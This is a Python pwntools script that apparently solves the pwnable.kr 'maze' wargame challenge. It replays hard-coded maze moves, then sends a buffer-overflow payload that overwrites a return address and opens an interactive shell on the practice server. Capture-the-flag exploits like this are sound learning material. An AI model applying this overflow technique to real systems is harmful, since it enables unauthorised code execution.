from pwn import *

class MazeExploit(object):

    INITIAL_LEVELS_SOLUTION = "ssdssddssddddwddssddsddsssassd"
    LEVEL_5_SOLUTION = "ssdssddssddddwddssddsddsssassOPENSESAMIadaaaaaMsssddddddddddddaaaaaaaaaaaawdadadawwdddddd"
    BOF_PAYLOAD = "A" * 56 + "\xb8\x17\x40"

    def __init__(self) -> None:
        self.shell = remote('pwnable.kr', 9014)

    def solve_initial_levels(self):
        for _ in range(4):
            self.shell.send(self.INITIAL_LEVELS_SOLUTION)
            print(self.shell.recvuntil("clear!"))

    def solve_level_5_and_exploit_bof(self):
        self.shell.send(self.LEVEL_5_SOLUTION)
        print(self.shell.recvuntil("name : "))
        self.shell.sendline(self.BOF_PAYLOAD)

    def run(self):
        self.shell.send("A")
        self.solve_initial_levels()
        self.solve_level_5_and_exploit_bof()
        self.shell.interactive()


if __name__ == '__main__':
    MazeExploit().run()
